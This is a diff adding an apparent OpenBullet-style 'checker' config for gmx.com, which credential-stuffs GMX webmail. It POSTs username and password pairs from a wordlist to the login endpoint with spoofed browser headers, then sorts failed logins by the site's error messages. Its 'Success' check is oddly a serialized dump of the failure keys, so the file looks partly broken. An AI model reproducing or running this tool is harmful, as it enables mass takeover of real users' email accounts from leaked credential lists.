@@ -1,0 +1,77 @@
+[SETTINGS]
+{
+  "Name": "gmx.com checker",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-10-29T11:44:10.8991646+00:00",
+  "AdditionalInfo": "",
+  "Author": "Tong Huu Thinh",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.gmx.com/mail/create-email-address/" 
+  CONTENT "service=mailint&uasServiceID=mc_starter_gmxcom&successURL=https%3A%2F%2F%24%28clientName%29-%24%28dataCenter%29.gmx.com%2Flogin&loginFailedURL=https%3A%2F%2Fwww.gmx.com%2Fint%2Flogout%2F%3Fls%3Dwd&loginErrorURL=https%3A%2F%2Fwww.gmx.com%2Fint%2Flogout%2F%3Fls%3Dte&edition=int&lang=en&usertype=standard&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-GB,en;q=0.9,en-US;q=0.8" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 351" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "origin: https://www.gmx.com" 
+  HEADER "referer: https://www.gmx.com/" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Edg/86.0.622.51" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<p>You've entered an invalid email address / password combination.</p>" 
+    KEY "<p>PLEASE TRY AGAIN!</p>" 
+  KEYCHAIN Success OR 
+    KEY "{\"$type\":\"System.Collections.Generic.List`1[[RuriLib.BlockBase, RuriLib]], mscorlib\",\"$values\":[{\"$type\":\"RuriLib.BlockKeycheck, RuriLib\",\"KeyChains\":{\"$type\":\"System.Collections.Generic.List`1[[RuriLib.Models.KeyChain, RuriLib]], mscorlib\",\"$values\":[{\"$type\":\"RuriLib.Models.KeyChain, RuriLib\",\"Type\":1,\"Mode\":0,\"CustomType\":\"CUSTOM\",\"Keys\":{\"$type\":\"System.Collections.ObjectModel.ObservableCollection`1[[RuriLib.Models.Key, RuriLib]], System\",\"$values\":[{\"$type\":\"RuriLib.Models.Key, RuriLib\",\"LeftTerm\":\"<SOURCE>\",\"Comparer\":4,\"RightTerm\":\"<p>You've entered an invalid email address / password combination.</p>\"},{\"$type\":\"RuriLib.Models.Key, RuriLib\",\"LeftTerm\":\"<SOURCE>\",\"Comparer\":4,\"RightTerm\":\"<p>PLEASE TRY AGAIN!</p>\"}]}}]},\"BanOn4XX\":false,\"BanOnToCheck\":true,\"Label\":\"KEY CHECK\",\"Disabled\":false}]}" 
